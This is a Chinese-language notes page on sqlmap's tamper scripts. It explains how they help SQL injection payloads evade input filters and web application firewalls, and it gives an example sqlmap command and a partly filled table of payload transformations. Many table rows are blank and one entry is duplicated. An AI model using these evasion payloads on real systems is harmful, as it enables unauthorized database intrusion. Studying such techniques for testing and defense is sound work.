# tamper

1、tamper的作用：  
使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击。

2、WAF是啥？

* WAF：Web应用程序防火墙，Web Application Firewall
* IPS：入侵防御系统， Intrusion Prevention System
* IDS：入侵检测系统，Intrusion Detection System

3、tamper用法

--tamper=TAMPER 利用给定的脚本进行篡改注入数据。其用法可举例说明：

sqlmap.py -u "[http://.../?uname=admin&pwd=pass123](http://.../?uname=admin&pwd=pass123)" --level=5 --risk=3 -p "uname" --tamper=xxx.py

表示对指定的url地址，以所设置的level等级、risk等级，并采用选定的tamper篡改脚本对参数“uname”进行检测

sqlmap中所有的tamper：

各种tamper的适用范围如下图所示：

![](../../.gitbook/assets/image%20%282%29.png)

各tamper的大意如下表格所示：

<table>
  <thead>
    <tr>
      <th style="text-align:left">tamper</th>
      <th style="text-align:left">&#x529F;&#x80FD;</th>
      <th style="text-align:left">&#x4E3E;&#x4F8B;</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">apostrophemask.py</td>
      <td style="text-align:left">&#x5BF9;&#x5F15;&#x53F7;&#x8FDB;&#x884C;utf-8&#x683C;&#x5F0F;&#x7F16;&#x7801;(%EF%BC%87)</td>
      <td
      style="text-align:left">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</td>
    </tr>
    <tr>
      <td style="text-align:left">apostrophenullencode.py</td>
      <td style="text-align:left">&#x7528;&#x975E;&#x6CD5;&#x7684;&#x53CC;unicode&#x5B57;&#x7B26;(%00%27)&#x66FF;&#x6362;&#x5F15;&#x53F7;&#x5B57;&#x7B26;</td>
      <td
      style="text-align:left">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 AND %00%271%00%27=%00%271</td>
    </tr>
    <tr>
      <td style="text-align:left">appendnullbyte.py</td>
      <td style="text-align:left">&#x5728;&#x6709;&#x6548;&#x8F7D;&#x8377;&#x7ED3;&#x675F;&#x4F4D;&#x7F6E;&#x52A0;&#x8F7D;&#x96F6;&#x5B57;&#x8282;&#x5B57;&#x7B26;&#x7F16;&#x7801;</td>
      <td
      style="text-align:left">1 AND 1=1 ==&gt; 1 AND 1=1%00</td>
    </tr>
    <tr>
      <td style="text-align:left">base64encode.py</td>
      <td style="text-align:left">&#x7528;base64&#x683C;&#x5F0F;&#x8FDB;&#x884C;&#x7F16;&#x7801;</td>
      <td
      style="text-align:left">1&apos; AND SLEEP(5)# ==&gt; MScgQU5EIFNMRUVQKDUpIw==</td>
    </tr>
    <tr>
      <td style="text-align:left">between.py</td>
      <td style="text-align:left">&#x7528;between&#x66FF;&#x6362;&#x5927;&#x4E8E;&#x53F7;&#xFF08;&gt;&#xFF09;</td>
      <td
      style="text-align:left">
        <p>1 AND A &gt; B --&#x200A; ==&gt; 1 AND A NOT BETWEEN 0 AND B&#x200A; --</p>
        <p>1 AND A = B --&#x200A; ==&gt; 1 AND A BETWEEN B AND B --</p>
        </td>
    </tr>
    <tr>
      <td style="text-align:left">bluecoat.py</td>
      <td style="text-align:left">&#x5BF9;SQL&#x8BED;&#x53E5;&#x66FF;&#x6362;&#x7A7A;&#x683C;&#x5B57;&#x7B26;&#x4E3A;(%09)&#xFF0C;&#x5E76;&#x66FF;&#x6362;&quot;=&quot;---&gt;&quot;LIKE&quot;</td>
      <td
      style="text-align:left">SELECT username FROM users WHERE id = 1 ==&gt; SELECT%09username FROM%09users
        WHERE%09id LIKE 1</td>
    </tr>
    <tr>
      <td style="text-align:left">apostrophemask.py</td>
      <td style="text-align:left">&#x7528;utf-8&#x683C;&#x5F0F;&#x7F16;&#x7801;&#x5F15;&#x53F7;(&#x5982;&#xFF1A;%EF%BC%87)</td>
      <td
      style="text-align:left">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</td>
    </tr>
    <tr>
      <td style="text-align:left">charunicodeencode.py</td>
      <td style="text-align:left">&#x5BF9;&#x5B57;&#x7B26;&#x4E32;&#x8FDB;&#x884C;Unicode&#x683C;&#x5F0F;&#x8F6C;&#x4E49;&#x7F16;&#x7801;</td>
      <td
      style="text-align:left">SELECT FIELD%20FROM TABLE ==&gt; %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</td>
    </tr>
    <tr>
      <td style="text-align:left">charencode.py</td>
      <td style="text-align:left">&#x91C7;&#x7528;url&#x683C;&#x5F0F;&#x7F16;&#x7801;1&#x6B21;</td>
      <td style="text-align:left">SELECT FIELD FROM%20TABLE ==&gt; %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</td>
    </tr>
    <tr>
      <td style="text-align:left">chardoubleencode.py</td>
      <td style="text-align:left">&#x91C7;&#x7528;url&#x683C;&#x5F0F;&#x7F16;&#x7801;2&#x6B21;</td>
      <td style="text-align:left">SELECT FIELD FROM%20TABLE ==&gt; %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</td>
    </tr>
    <tr>
      <td style="text-align:left">commalessmid.py</td>
      <td style="text-align:left">&#x5C06;payload&#x4E2D;&#x7684;&#x9017;&#x53F7;&#x7528; from&#x548C;for&#x4EE3;&#x66FF;&#xFF0C;&#x7528;&#x4E8E;&#x8FC7;&#x6EE4;&#x4E86;&#x9017;&#x53F7;&#x5E76;&#x4E14;&#x662F;3&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;</td>
      <td
      style="text-align:left">MID(VERSION(), 1, 1) ==&gt; MID(VERSION() FROM 1 FOR 1)</td>
    </tr>
    <tr>
      <td style="text-align:left">concat2concatws.py</td>
      <td style="text-align:left">CONCAT() ==&gt; CONCAT_WS()&#xFF0C;&#x7528;&#x4E8E;&#x8FC7;&#x6EE4;&#x4E86;CONCAT()&#x51FD;&#x6570;&#x7684;&#x60C5;&#x51B5;</td>
      <td
      style="text-align:left">CONCAT(1,2) ==&gt; CONCAT_WS(MID(CHAR(0),0,0),1,2)</td>
    </tr>
    <tr>
      <td style="text-align:left">equaltolike.py</td>
      <td style="text-align:left">= ==&gt; LIKE&#xFF0C;&#x7528;&#x4E8E;&#x8FC7;&#x6EE4;&#x4E86;&#x7B49;&#x53F7;&quot;=&quot;&#x7684;&#x60C5;&#x51B5;</td>
      <td
      style="text-align:left">SELECT <em> FROM users WHERE id=1 ==&gt; SELECT </em> FROM users WHERE id
        LIKE 1</td>
    </tr>
    <tr>
      <td style="text-align:left">greatest.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">halfversionedmorekeywords.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">ifnull2ifisnull.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">informationschemacomment.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">lowercase.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">modsecurityversioned.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">modsecurityzeroversioned.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">multiplespaces.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">nonrecursivereplacement.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">overlongutf8.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">percentage.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">randomcase.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">randomcomments.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">securesphere.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">space2comment.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">space2dash.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">space2hash.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">space2morehash.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">space2mssqlblank.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">space2mssqlhash.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">space2plus.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">space2randomblank.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">sp_password.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">symboliclogical.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">unionalltounion.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">unmagicquotes.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">uppercase.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">varnish.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">versionedkeywords.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">versionedmorekeywords.py</td>
      <td style="text-align:left">&#x5BF9;&#x6BCF;&#x4E2A;&#x5173;&#x952E;&#x5B57;&#x8FDB;&#x884C;&#x6CE8;&#x91CA;&#x5904;&#x7406;</td>
      <td
      style="text-align:left">1 union select user() ==&gt; 1/!UNION//!SELECT/user()</td>
    </tr>
    <tr>
      <td style="text-align:left">xforwardedfor.py</td>
      <td style="text-align:left">&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x4F2A;&#x9020;&#x7684;HTTP&#x5934;&#x201C;
        X-Forwarded-For &#x201D;&#x6765;&#x7ED5;&#x8FC7;WAF</td>
      <td style="text-align:left">headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-Forwarded-For&quot;]
        = randomIP()return payload</td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
  </tbody>
</table>

